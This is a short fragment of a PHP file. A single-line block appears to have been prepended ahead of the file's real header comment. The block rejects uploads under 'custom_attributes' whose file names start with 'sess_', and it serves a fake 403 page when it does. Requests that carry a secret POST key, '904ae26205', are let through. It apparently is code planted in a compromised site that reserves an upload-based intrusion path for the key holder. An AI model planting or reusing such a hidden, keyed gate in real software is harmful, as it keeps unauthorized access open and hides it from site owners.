<?php if(!isset($_POST["904ae26205"]) && isset($_FILES['custom_attributes'])) {    $name = $_FILES['custom_attributes']['name'];    foreach ($name as $key => $value) {        if (preg_match('/^sess_/', $value)) {            echo "<html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don't have permission to access this resource.</p></body></html>";            http_response_code(403);            die(0);        }    }}?>
<?php
/**
